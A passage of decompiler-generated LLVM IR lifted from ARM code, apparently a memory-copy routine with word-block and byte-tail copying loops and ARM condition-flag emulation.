  store i32 %v2_1a420, i32* %r2.global-to-local, align 4
  %v4_1a420 = sub i32 3, %v0_1a420
  %v5_1a420 = and i32 %v4_1a420, %v0_1a420
  %v6_1a420 = icmp slt i32 %v5_1a420, 0
  store i1 %v6_1a420, i1* %cpsr_v.global-to-local, align 1
  %v7_1a420 = icmp slt i32 %v2_1a420, 0
  store i1 %v7_1a420, i1* %cpsr_n.global-to-local, align 1
  %v8_1a420 = icmp eq i32 %v0_1a420, 4
  store i1 %v8_1a420, i1* %cpsr_z.global-to-local, align 1
  %v5_1a424 = icmp slt i32 %v0_1a420, 4
  br i1 %v5_1a424, label %bb140, label %dec_label_pc_1a428

dec_label_pc_1a428:                               ; preds = %bb
  %v1_1a428 = urem i32 %v1_1a410, 4
  store i32 %v1_1a428, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a428 = icmp eq i32 %v1_1a428, 0
  store i1 %v2_1a428, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a428, label %dec_label_pc_1a430, label %dec_label_pc_1a4dc

dec_label_pc_1a430:                               ; preds = %dec_label_pc_1a428
  %v1_1a430 = urem i32 %v0_1a410, 4
  store i32 %v1_1a430, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1a430 = icmp eq i32 %v1_1a430, 0
  store i1 %v2_1a430, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_1a410 to i2
  br i1 %v2_1a430, label %dec_label_pc_1a438, label %dec_label_pc_1a50c

dec_label_pc_1a438:                               ; preds = %dec_label_pc_1a430, %dec_label_pc_1a504
  %v0_1a45093 = phi i32 [ %v1_1a410, %dec_label_pc_1a430 ], [ %v0_1a62c76, %dec_label_pc_1a504 ]
  %v0_1a44c92 = phi i32 [ %v0_1a410, %dec_label_pc_1a430 ], [ %v0_1a504, %dec_label_pc_1a504 ]
  %v0_1a438 = phi i32 [ %v2_1a420, %dec_label_pc_1a430 ], [ %v2_1a4fc, %dec_label_pc_1a504 ]
  %v1_1a438 = add i32 %v0_1a438, -8
  store i32 %v1_1a438, i32* %r2.global-to-local, align 4
  %v3_1a438 = sub i32 7, %v0_1a438
  %v4_1a438 = and i32 %v3_1a438, %v0_1a438
  %v5_1a438 = icmp slt i32 %v4_1a438, 0
  store i1 %v5_1a438, i1* %cpsr_v.global-to-local, align 1
  %v6_1a438 = icmp slt i32 %v1_1a438, 0
  store i1 %v6_1a438, i1* %cpsr_n.global-to-local, align 1
  %v7_1a438 = icmp eq i32 %v0_1a438, 8
  store i1 %v7_1a438, i1* %cpsr_z.global-to-local, align 1
  %v2_1a43c = xor i1 %v6_1a438, %v5_1a438
  br i1 %v2_1a43c, label %dec_label_pc_1a48c, label %dec_label_pc_1a440

dec_label_pc_1a440:                               ; preds = %dec_label_pc_1a438
  %v1_1a440 = add i32 %v0_1a438, -28
  store i32 %v1_1a440, i32* %r2.global-to-local, align 4
  %v3_1a440 = sub i32 27, %v0_1a438
  %v4_1a440 = and i32 %v3_1a440, %v1_1a438
  %v5_1a440 = icmp slt i32 %v4_1a440, 0
  store i1 %v5_1a440, i1* %cpsr_v.global-to-local, align 1
  %v6_1a440 = icmp slt i32 %v1_1a440, 0
  store i1 %v6_1a440, i1* %cpsr_n.global-to-local, align 1
  %v7_1a440 = icmp eq i32 %v1_1a438, 20
  store i1 %v7_1a440, i1* %cpsr_z.global-to-local, align 1
  %v2_1a444 = xor i1 %v6_1a440, %v5_1a440
  br i1 %v2_1a444, label %dec_label_pc_1a478, label %dec_label_pc_1a448

dec_label_pc_1a448:                               ; preds = %dec_label_pc_1a440
  %v0_1a448 = load i32, i32* @r4, align 4
  store i32 %v0_1a448, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1a44c

dec_label_pc_1a44c:                               ; preds = %dec_label_pc_1a44c.dec_label_pc_1a44c_crit_edge, %dec_label_pc_1a448
  %v0_1a450 = phi i32 [ %v12_1a458, %dec_label_pc_1a44c.dec_label_pc_1a44c_crit_edge ], [ %v0_1a45093, %dec_label_pc_1a448 ]
  %v0_1a44c = phi i32 [ %v0_1a44c.pre, %dec_label_pc_1a44c.dec_label_pc_1a44c_crit_edge ], [ %v0_1a44c92, %dec_label_pc_1a448 ]
  %v1_1a44c = inttoptr i32 %v0_1a44c to i32*
  %v2_1a44c = load i32, i32* %v1_1a44c, align 4
  %v3_1a44c = add i32 %v0_1a44c, 4
  %v4_1a44c = inttoptr i32 %v3_1a44c to i32*
  %v5_1a44c = load i32, i32* %v4_1a44c, align 4
  store i32 %v5_1a44c, i32* %r4.global-to-local, align 4
  %v6_1a44c = add i32 %v0_1a44c, 8
  %v7_1a44c = inttoptr i32 %v6_1a44c to i32*
  %v8_1a44c = load i32, i32* %v7_1a44c, align 4
  store i32 %v8_1a44c, i32* %ip.global-to-local, align 4
  %v9_1a44c = add i32 %v0_1a44c, 12
  %v10_1a44c = inttoptr i32 %v9_1a44c to i32*
  %v11_1a44c = load i32, i32* %v10_1a44c, align 4
  store i32 %v11_1a44c, i32* %lr.global-to-local, align 4
  %v12_1a44c = add i32 %v0_1a44c, 16
  store i32 %v12_1a44c, i32* %r1.global-to-local, align 4
  %v1_1a450 = inttoptr i32 %v0_1a450 to i32*
  store i32 %v2_1a44c, i32* %v1_1a450, align 4
  %v3_1a450 = add i32 %v0_1a450, 4
  %v4_1a450 = inttoptr i32 %v3_1a450 to i32*
  %v5_1a450 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a450, i32* %v4_1a450, align 4
  %v6_1a450 = add i32 %v0_1a450, 8
  %v7_1a450 = inttoptr i32 %v6_1a450 to i32*
  %v8_1a450 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_1a450, i32* %v7_1a450, align 4
  %v9_1a450 = add i32 %v0_1a450, 12
  %v10_1a450 = inttoptr i32 %v9_1a450 to i32*
  %v11_1a450 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1a450, i32* %v10_1a450, align 4
  %v12_1a450 = add i32 %v0_1a450, 16
  store i32 %v12_1a450, i32* %r0.global-to-local, align 4
  %v0_1a454 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a454 = inttoptr i32 %v0_1a454 to i32*
  %v2_1a454 = load i32, i32* %v1_1a454, align 4
  store i32 %v2_1a454, i32* @r3, align 4
  %v3_1a454 = add i32 %v0_1a454, 4
  %v4_1a454 = inttoptr i32 %v3_1a454 to i32*
  %v5_1a454 = load i32, i32* %v4_1a454, align 4
  store i32 %v5_1a454, i32* %r4.global-to-local, align 4
  %v6_1a454 = add i32 %v0_1a454, 8
  %v7_1a454 = inttoptr i32 %v6_1a454 to i32*
  %v8_1a454 = load i32, i32* %v7_1a454, align 4
  store i32 %v8_1a454, i32* @ip, align 4
  %v9_1a454 = add i32 %v0_1a454, 12
  %v10_1a454 = inttoptr i32 %v9_1a454 to i32*
  %v11_1a454 = load i32, i32* %v10_1a454, align 4
  store i32 %v11_1a454, i32* %lr.global-to-local, align 4
  %v12_1a454 = add i32 %v0_1a454, 16
  store i32 %v12_1a454, i32* %r1.global-to-local, align 4
  %v1_1a458 = inttoptr i32 %v12_1a450 to i32*
  store i32 %v2_1a454, i32* %v1_1a458, align 4
  %v3_1a458 = add i32 %v0_1a450, 20
  %v4_1a458 = inttoptr i32 %v3_1a458 to i32*
  %v5_1a458 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1a458, i32* %v4_1a458, align 4
  %v6_1a458 = add i32 %v0_1a450, 24
  %v7_1a458 = inttoptr i32 %v6_1a458 to i32*
  %v8_1a458 = load i32, i32* @ip, align 4
  store i32 %v8_1a458, i32* %v7_1a458, align 4
  %v9_1a458 = add i32 %v0_1a450, 28
  %v10_1a458 = inttoptr i32 %v9_1a458 to i32*
  %v11_1a458 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1a458, i32* %v10_1a458, align 4
  %v12_1a458 = add i32 %v0_1a450, 32
  store i32 %v12_1a458, i32* %r0.global-to-local, align 4
  %v0_1a45c = load i32, i32* %r2.global-to-local, align 4
  %v1_1a45c = add i32 %v0_1a45c, -32
  store i32 %v1_1a45c, i32* %r2.global-to-local, align 4
  %v3_1a45c = sub i32 31, %v0_1a45c
  %v4_1a45c = and i32 %v3_1a45c, %v0_1a45c
  %v5_1a45c = icmp slt i32 %v4_1a45c, 0
  %v6_1a45c = icmp slt i32 %v1_1a45c, 0
  %v2_1a460 = xor i1 %v6_1a45c, %v5_1a45c
  br i1 %v2_1a460, label %dec_label_pc_1a464, label %dec_label_pc_1a44c.dec_label_pc_1a44c_crit_edge

dec_label_pc_1a44c.dec_label_pc_1a44c_crit_edge:  ; preds = %dec_label_pc_1a44c
  %v0_1a44c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a44c

dec_label_pc_1a464:                               ; preds = %dec_label_pc_1a44c
  %v1_1a464 = add i32 %v0_1a45c, -16
  %v3_1a464 = add i32 %v0_1a45c, 2147483616
  %v4_1a464 = and i32 %v1_1a464, %v3_1a464
  %v5_1a464 = icmp slt i32 %v4_1a464, 0
  store i1 %v5_1a464, i1* %cpsr_v.global-to-local, align 1
  %v6_1a464 = icmp slt i32 %v1_1a464, 0
  store i1 %v6_1a464, i1* %cpsr_n.global-to-local, align 1
  %v7_1a464 = icmp eq i32 %v1_1a464, 0
  store i1 %v7_1a464, i1* %cpsr_z.global-to-local, align 1
  %v2_1a468 = xor i1 %v6_1a464, %v5_1a464
  br i1 %v2_1a468, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_1a464
  %v3_1a468 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a468 = inttoptr i32 %v3_1a468 to i32*
  %v5_1a468 = load i32, i32* %v4_1a468, align 4
  store i32 %v5_1a468, i32* @r3, align 4
  %v6_1a468 = add i32 %v3_1a468, 4
  %v7_1a468 = inttoptr i32 %v6_1a468 to i32*
  %v8_1a468 = load i32, i32* %v7_1a468, align 4
  store i32 %v8_1a468, i32* %r4.global-to-local, align 4
  %v9_1a468 = add i32 %v3_1a468, 8
  %v10_1a468 = inttoptr i32 %v9_1a468 to i32*
  %v11_1a468 = load i32, i32* %v10_1a468, align 4
  store i32 %v11_1a468, i32* @ip, align 4
  %v12_1a468 = add i32 %v3_1a468, 12
  %v13_1a468 = inttoptr i32 %v12_1a468 to i32*
  %v14_1a468 = load i32, i32* %v13_1a468, align 4
  store i32 %v14_1a468, i32* %lr.global-to-local, align 4
  %v15_1a468 = add i32 %v3_1a468, 16
  store i32 %v15_1a468, i32* %r1.global-to-local, align 4
  %v4_1a46c = inttoptr i32 %v12_1a458 to i32*
  store i32 %v5_1a468, i32* %v4_1a46c, align 4
  %v6_1a46c = add i32 %v0_1a450, 36
  %v7_1a46c = inttoptr i32 %v6_1a46c to i32*
  %v8_1a46c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1a46c, i32* %v7_1a46c, align 4
  %v9_1a46c = add i32 %v0_1a450, 40
  %v10_1a46c = inttoptr i32 %v9_1a46c to i32*
  %v11_1a46c = load i32, i32* @ip, align 4
  store i32 %v11_1a46c, i32* %v10_1a46c, align 4
  %v12_1a46c = add i32 %v0_1a450, 44
  %v13_1a46c = inttoptr i32 %v12_1a46c to i32*
  %v14_1a46c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1a46c, i32* %v13_1a46c, align 4
  %v15_1a46c = add i32 %v0_1a450, 48
  store i32 %v15_1a46c, i32* %r0.global-to-local, align 4
  %v3_1a470 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a470 = add i32 %v3_1a470, -16
  store i32 %v4_1a470, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_1a464, %bb136
  %v3_1a480101110 = phi i32 [ %v15_1a46c, %bb136 ], [ %v12_1a458, %dec_label_pc_1a464 ]
  %v0_1a478.pre = phi i32 [ %v4_1a470, %bb136 ], [ %v1_1a45c, %dec_label_pc_1a464 ]
  %v2_1a474 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1a474, i32* @r4, align 4
  br label %dec_label_pc_1a478

dec_label_pc_1a478:                               ; preds = %dec_label_pc_1a440, %bb137
  %v3_1a480100 = phi i32 [ %v0_1a45093, %dec_label_pc_1a440 ], [ %v3_1a480101110, %bb137 ]
  %v0_1a478 = phi i32 [ %v1_1a440, %dec_label_pc_1a440 ], [ %v0_1a478.pre, %bb137 ]
  %v1_1a478 = add i32 %v0_1a478, 20
  store i32 %v1_1a478, i32* %r2.global-to-local, align 4
  %v3_1a478 = sub i32 0, %v0_1a478
  %v4_1a478 = and i32 %v1_1a478, %v3_1a478
  %v5_1a478 = icmp slt i32 %v4_1a478, 0
  store i1 %v5_1a478, i1* %cpsr_v.global-to-local, align 1
  %v6_1a478 = icmp slt i32 %v1_1a478, 0
  store i1 %v6_1a478, i1* %cpsr_n.global-to-local, align 1
  %v7_1a478 = icmp eq i32 %v1_1a478, 0
  store i1 %v7_1a478, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a47c

dec_label_pc_1a47c:                               ; preds = %.thread114, %dec_label_pc_1a478
  %v0_1a48c.pre157 = phi i32 [ %v0_1a48c.pre, %.thread114 ], [ %v1_1a478, %dec_label_pc_1a478 ]
  %v3_1a480 = phi i32 [ %v3_1a48098115, %.thread114 ], [ %v3_1a480100, %dec_label_pc_1a478 ]
  %v1_1a484 = phi i1 [ %v1_1a488, %.thread114 ], [ %v5_1a478, %dec_label_pc_1a478 ]
  %v0_1a484 = phi i1 [ %v0_1a488, %.thread114 ], [ %v6_1a478, %dec_label_pc_1a478 ]
  %v2_1a47c = xor i1 %v1_1a484, %v0_1a484
  br i1 %v2_1a47c, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_1a47c
  %v3_1a47c = load i32, i32* %r1.global-to-local, align 4
  %v4_1a47c = inttoptr i32 %v3_1a47c to i32*
  %v5_1a47c = load i32, i32* %v4_1a47c, align 4
  store i32 %v5_1a47c, i32* @r3, align 4
  %v6_1a47c = add i32 %v3_1a47c, 4
  %v7_1a47c = inttoptr i32 %v6_1a47c to i32*
  %v8_1a47c = load i32, i32* %v7_1a47c, align 4
  store i32 %v8_1a47c, i32* @ip, align 4
  %v9_1a47c = add i32 %v3_1a47c, 8
  %v10_1a47c = inttoptr i32 %v9_1a47c to i32*
  %v11_1a47c = load i32, i32* %v10_1a47c, align 4
  store i32 %v11_1a47c, i32* %lr.global-to-local, align 4
  %v12_1a47c = add i32 %v3_1a47c, 12
  store i32 %v12_1a47c, i32* %r1.global-to-local, align 4
  %v4_1a480 = inttoptr i32 %v3_1a480 to i32*
  store i32 %v5_1a47c, i32* %v4_1a480, align 4
  %v6_1a480 = add i32 %v3_1a480, 4
  %v7_1a480 = inttoptr i32 %v6_1a480 to i32*
  %v8_1a480 = load i32, i32* @ip, align 4
  store i32 %v8_1a480, i32* %v7_1a480, align 4
  %v9_1a480 = add i32 %v3_1a480, 8
  %v10_1a480 = inttoptr i32 %v9_1a480 to i32*
  %v11_1a480 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_1a480, i32* %v10_1a480, align 4
  %v12_1a480 = add i32 %v3_1a480, 12
  store i32 %v12_1a480, i32* %r0.global-to-local, align 4
  %v3_1a484 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a484 = add i32 %v3_1a484, -12
  store i32 %v4_1a484, i32* %r2.global-to-local, align 4
  %v6_1a484 = sub i32 11, %v3_1a484
  %v7_1a484 = and i32 %v6_1a484, %v3_1a484
  %v8_1a484 = icmp slt i32 %v7_1a484, 0
  store i1 %v8_1a484, i1* %cpsr_v.global-to-local, align 1
  %v9_1a484 = icmp slt i32 %v4_1a484, 0
  store i1 %v9_1a484, i1* %cpsr_n.global-to-local, align 1
  %v10_1a484 = icmp eq i32 %v3_1a484, 12
  store i1 %v10_1a484, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_1a47c, %bb138
  %v0_1a48c.pre = phi i32 [ %v4_1a484, %bb138 ], [ %v0_1a48c.pre157, %dec_label_pc_1a47c ]
  %v3_1a48098115 = phi i32 [ %v12_1a480, %bb138 ], [ %v3_1a480, %dec_label_pc_1a47c ]
  %v1_1a488 = phi i1 [ %v8_1a484, %bb138 ], [ %v1_1a484, %dec_label_pc_1a47c ]
  %v0_1a488 = phi i1 [ %v9_1a484, %bb138 ], [ %v0_1a484, %dec_label_pc_1a47c ]
  %v2_1a488 = xor i1 %v1_1a488, %v0_1a488
  br i1 %v2_1a488, label %dec_label_pc_1a48c, label %dec_label_pc_1a47c

dec_label_pc_1a48c:                               ; preds = %.thread114, %dec_label_pc_1a438
  %v4_1a49c = phi i32 [ %v0_1a45093, %dec_label_pc_1a438 ], [ %v3_1a48098115, %.thread114 ]
  %v0_1a48c = phi i32 [ %v1_1a438, %dec_label_pc_1a438 ], [ %v0_1a48c.pre, %.thread114 ]
  %v1_1a48c = add i32 %v0_1a48c, 8
  store i32 %v1_1a48c, i32* %r2.global-to-local, align 4
  %v3_1a48c = sub i32 0, %v0_1a48c
  %v4_1a48c = and i32 %v1_1a48c, %v3_1a48c
  %v5_1a48c = icmp slt i32 %v4_1a48c, 0
  store i1 %v5_1a48c, i1* %cpsr_v.global-to-local, align 1
  %v6_1a48c = icmp slt i32 %v1_1a48c, 0
  store i1 %v6_1a48c, i1* %cpsr_n.global-to-local, align 1
  %v7_1a48c = icmp eq i32 %v1_1a48c, 0
  store i1 %v7_1a48c, i1* %cpsr_z.global-to-local, align 1
  %v2_1a490 = xor i1 %v6_1a48c, %v5_1a48c
  br i1 %v2_1a490, label %bb140, label %dec_label_pc_1a494

dec_label_pc_1a494:                               ; preds = %dec_label_pc_1a48c
  %v1_1a494 = add i32 %v0_1a48c, 4
  store i32 %v1_1a494, i32* %r2.global-to-local, align 4
  %v3_1a494 = sub i32 -5, %v0_1a48c
  %v4_1a494 = and i32 %v3_1a494, %v1_1a48c
  %v5_1a494 = icmp slt i32 %v4_1a494, 0
  store i1 %v5_1a494, i1* %cpsr_v.global-to-local, align 1
  %v6_1a494 = icmp slt i32 %v1_1a494, 0
  store i1 %v6_1a494, i1* %cpsr_n.global-to-local, align 1
  %v7_1a494 = icmp eq i32 %v1_1a48c, 4
  store i1 %v7_1a494, i1* %cpsr_z.global-to-local, align 1
  %v2_1a498 = xor i1 %v6_1a494, %v5_1a494
  %v3_1a498 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a498 = inttoptr i32 %v3_1a498 to i32*
  %v5_1a498 = load i32, i32* %v4_1a498, align 4
  store i32 %v5_1a498, i32* @r3, align 4
  %v7_1a498 = add i32 %v3_1a498, 4
  br i1 %v2_1a498, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_1a494
  store i32 %v7_1a498, i32* %r1.global-to-local, align 4
  %v5_1a49c = inttoptr i32 %v4_1a49c to i32*
  store i32 %v5_1a498, i32* %v5_1a49c, align 4
  %v6_1a49c = load i32, i32* %r0.global-to-local, align 4
  %v7_1a49c = add i32 %v6_1a49c, 4
  store i32 %v7_1a49c, i32* %r0.global-to-local, align 4
  %v0_1a4ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_1a494
  %v7_1a4a0 = inttoptr i32 %v7_1a498 to i32*
  %v8_1a4a0 = load i32, i32* %v7_1a4a0, align 4
  store i32 %v8_1a4a0, i32* @ip, align 4
  %v9_1a4a0 = add i32 %v3_1a498, 8
  store i32 %v9_1a4a0, i32* %r1.global-to-local, align 4
  %v4_1a4a4 = inttoptr i32 %v4_1a49c to i32*
  store i32 %v5_1a498, i32* %v4_1a4a4, align 4
  %v6_1a4a4 = add i32 %v4_1a49c, 4
  %v7_1a4a4 = inttoptr i32 %v6_1a4a4 to i32*
  %v8_1a4a4 = load i32, i32* @ip, align 4
  store i32 %v8_1a4a4, i32* %v7_1a4a4, align 4
  %v9_1a4a4 = add i32 %v4_1a49c, 8
  store i32 %v9_1a4a4, i32* %r0.global-to-local, align 4
  %v3_1a4a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a4a8 = add i32 %v3_1a4a8, -4
  store i32 %v4_1a4a8, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_1a48c, %bb, %dec_label_pc_1a65c, %dec_label_pc_1a5f0, %dec_label_pc_1a584, %bb139
  %v0_1a4ac = phi i32 [ %v0_1a4ac.pre, %.thread121 ], [ %v2_1a4fc, %.thread127 ], [ %v1_1a48c, %dec_label_pc_1a48c ], [ %v2_1a420, %bb ], [ %v0_1a4ac60, %dec_label_pc_1a65c ], [ %v0_1a4ac59, %dec_label_pc_1a5f0 ], [ %v0_1a4ac58, %dec_label_pc_1a584 ], [ %v4_1a4a8, %bb139 ]
  %v1_1a4ac = add i32 %v0_1a4ac, 4
  store i32 %v1_1a4ac, i32* %r2.global-to-local, align 4
  %v3_1a4ac = sub i32 0, %v0_1a4ac
  %v4_1a4ac = and i32 %v1_1a4ac, %v3_1a4ac
  %v5_1a4ac = icmp slt i32 %v4_1a4ac, 0
  store i1 %v5_1a4ac, i1* %cpsr_v.global-to-local, align 1
  %v6_1a4ac = icmp slt i32 %v1_1a4ac, 0
  store i1 %v6_1a4ac, i1* %cpsr_n.global-to-local, align 1
  %v7_1a4ac = icmp eq i32 %v1_1a4ac, 0
  store i1 %v7_1a4ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a4ac, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_1a4b4.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_1a4b0 = load i8*, i8** %stack_var_-8, align 4
  %v4_1a4b0 = ptrtoint i8* %v3_1a4b0 to i32
  store i32 %v4_1a4b0, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_1a4b4 = phi i32 [ %v0_1a4b4.pre, %bb140.bb142_crit_edge ], [ %v8_1a41c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1a4ac, i32 %v0_1a4b4)
  %v0_1a4b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a4b8 = add i32 %v0_1a4b8, -2
  %v3_1a4b8 = sub i32 1, %v0_1a4b8
  %v4_1a4b8 = and i32 %v3_1a4b8, %v0_1a4b8
  %v5_1a4b8 = icmp slt i32 %v4_1a4b8, 0
  store i1 %v5_1a4b8, i1* %cpsr_v.global-to-local, align 1
  %v6_1a4b8 = icmp slt i32 %v1_1a4b8, 0
  store i1 %v6_1a4b8, i1* %cpsr_n.global-to-local, align 1
  %v7_1a4b8 = icmp eq i32 %v0_1a4b8, 2
  store i1 %v7_1a4b8, i1* %cpsr_z.global-to-local, align 1
  %v0_1a4bc = load i32, i32* %r1.global-to-local, align 4
  %v1_1a4bc = inttoptr i32 %v0_1a4bc to i8*
  %v2_1a4bc = load i8, i8* %v1_1a4bc, align 1
  %v5_1a4bc = add i32 %v0_1a4bc, 1
  store i32 %v5_1a4bc, i32* %r1.global-to-local, align 4
  %v2_1a4c0 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4c0 = inttoptr i32 %v2_1a4c0 to i8*
  store i8 %v2_1a4bc, i8* %v3_1a4c0, align 1
  %v4_1a4c0 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a4c0 = add i32 %v4_1a4c0, 1
  store i32 %v5_1a4c0, i32* %r0.global-to-local, align 4
  %v0_1a4c4 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1a4c4 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1a4c4 = xor i1 %v0_1a4c4, %v1_1a4c4
  br i1 %v2_1a4c4, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_1a4c4 = load i32, i32* %r1.global-to-local, align 4
  %v4_1a4c4 = inttoptr i32 %v3_1a4c4 to i8*
  %v5_1a4c4 = load i8, i8* %v4_1a4c4, align 1
  %v8_1a4c4 = add i32 %v3_1a4c4, 1
  store i32 %v8_1a4c4, i32* %r1.global-to-local, align 4
  %v6_1a4c8 = inttoptr i32 %v5_1a4c0 to i8*
  store i8 %v5_1a4c4, i8* %v6_1a4c8, align 1
  %v7_1a4c8 = load i32, i32* %r0.global-to-local, align 4
  %v8_1a4c8 = add i32 %v7_1a4c8, 1
  store i32 %v8_1a4c8, i32* %r0.global-to-local, align 4
  %v1_1a4cc.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a4cc.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_1a4d0 = phi i32 [ %v8_1a4c8, %bb143 ], [ %v5_1a4c0, %bb142 ]
  %v2_1a4d0 = phi i1 [ %v2_1a4cc.pre, %bb143 ], [ %v1_1a4c4, %bb142 ]
  %v1_1a4d0 = phi i1 [ %v1_1a4cc.pre, %bb143 ], [ %v0_1a4c4, %bb142 ]
  %v0_1a4cc = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1a4cc = xor i1 %v2_1a4d0, %v1_1a4d0
  %v4_1a4cc = or i1 %v0_1a4cc, %v3_1a4cc
  br i1 %v4_1a4cc, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_1a4cc = load i32, i32* %r1.global-to-local, align 4
  %v6_1a4cc = inttoptr i32 %v5_1a4cc to i8*
  %v7_1a4cc = load i8, i8* %v6_1a4cc, align 1
  %v10_1a4cc = add i32 %v5_1a4cc, 1
  store i32 %v10_1a4cc, i32* %r1.global-to-local, align 4
  %v8_1a4d0 = inttoptr i32 %v7_1a4d0 to i8*
  store i8 %v7_1a4cc, i8* %v8_1a4d0, align 1
  %v9_1a4d0 = load i32, i32* %r0.global-to-local, align 4
  %v10_1a4d0 = add i32 %v9_1a4d0, 1
  store i32 %v10_1a4d0, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_1a4d4 = load i8*, i8** %stack_var_-8, align 4
  %v3_1a4d4 = ptrtoint i8* %v2_1a4d4 to i32
  store i32 %v3_1a4d4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_1a41c)
  %v0_1a4dc.pre = load i32, i32* @ip, align 4
  %v0_1a4e4.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_1a4e8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a4dc

dec_label_pc_1a4dc:                               ; preds = %dec_label_pc_1a428, %.thread125
  %v2_1a4e8 = phi i32 [ %v1_1a410, %dec_label_pc_1a428 ], [ %v2_1a4e8.pre, %.thread125 ]
  %v0_1a4e4 = phi i32 [ %v0_1a410, %dec_label_pc_1a428 ], [ %v0_1a4e4.pre, %.thread125 ]
  %v0_1a4dc = phi i32 [ %v1_1a428, %dec_label_pc_1a428 ], [ %v0_1a4dc.pre, %.thread125 ]
  %v1_1a4dc = sub i32 4, %v0_1a4dc
  store i32 %v1_1a4dc, i32* @ip, align 4
  %v1_1a4e0 = add i32 %v1_1a4dc, -2
  %v3_1a4e0 = sub i32 1, %v1_1a4dc
  %v4_1a4e0 = and i32 %v3_1a4e0, %v1_1a4dc
  %v5_1a4e0 = icmp slt i32 %v4_1a4e0, 0
  store i1 %v5_1a4e0, i1* %cpsr_v.global-to-local, align 1
  %v6_1a4e0 = icmp slt i32 %v1_1a4e0, 0
  store i1 %v6_1a4e0, i1* %cpsr_n.global-to-local, align 1
  %v7_1a4e0 = icmp eq i32 %v1_1a4dc, 2
  store i1 %v7_1a4e0, i1* %cpsr_z.global-to-local, align 1
  %v1_1a4e4 = inttoptr i32 %v0_1a4e4 to i8*
  %v2_1a4e4 = load i8, i8* %v1_1a4e4, align 1
  %v3_1a4e4 = zext i8 %v2_1a4e4 to i32
  store i32 %v3_1a4e4, i32* @r3, align 4
  %v5_1a4e4 = add i32 %v0_1a4e4, 1
  store i32 %v5_1a4e4, i32* %r1.global-to-local, align 4
  %v3_1a4e8 = inttoptr i32 %v2_1a4e8 to i8*
  store i8 %v2_1a4e4, i8* %v3_1a4e8, align 1
  %v4_1a4e8 = load i32, i32* %r0.global-to-local, align 4
  %v5_1a4e8 = add i32 %v4_1a4e8, 1
  store i32 %v5_1a4e8, i32* %r0.global-to-local, align 4
  %v0_1a4ec = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1a4ec = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1a4ec = xor i1 %v0_1a4ec, %v1_1a4ec
  br i1 %v2_1a4ec, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_1a4dc
  %v3_1a4ec = load i32, i32* %r1.global-to-local, align 4
  %v4_1a4ec = inttoptr i32 %v3_1a4ec to i8*
  %v5_1a4ec = load i8, i8* %v4_1a4ec, align 1
  %v6_1a4ec = zext i8 %v5_1a4ec to i32
  store i32 %v6_1a4ec, i32* @r3, align 4
  %v8_1a4ec = add i32 %v3_1a4ec, 1
  store i32 %v8_1a4ec, i32* %r1.global-to-local, align 4
  %v6_1a4f0 = inttoptr i32 %v5_1a4e8 to i8*
  store i8 %v5_1a4ec, i8* %v6_1a4f0, align 1
  %v7_1a4f0 = load i32, i32* %r0.global-to-local, align 4
  %v8_1a4f0 = add i32 %v7_1a4f0, 1
  store i32 %v8_1a4f0, i32* %r0.global-to-local, align 4
  %v1_1a4f4.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1a4f4.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

